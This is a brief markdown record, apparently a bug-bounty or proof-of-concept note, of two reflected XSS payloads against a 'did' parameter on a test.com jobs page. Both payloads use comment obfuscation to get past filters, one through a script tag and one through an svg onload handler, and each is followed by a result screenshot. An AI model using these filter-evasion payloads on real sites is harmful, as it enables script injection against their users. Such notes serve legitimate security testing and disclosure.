**URL:**<br/>[http://test.com/pages/jobs.asp?did=123456"><\<script/**/>/*test*/alert(/xss/)/*123*/</script>](http://test.com/pages/jobs.asp?did=123456"><\<script/**/>/*test*/alert(/xss/)/*123*/</script>)

**Payload:**<br/>`"><\<script/**/>/*test*/alert(/xss/)/*123*/</script>`

**Result:**<br/>![](https://i.imgur.com/k1a4A3Q.png)<br/>


**Payload:**<br/>`"/**/></*svg*/><svg/*test*/onload=alert(/xss/)/*111*/>`

**Result:**<br/>![](https://i.imgur.com/aaoIz5m.png)
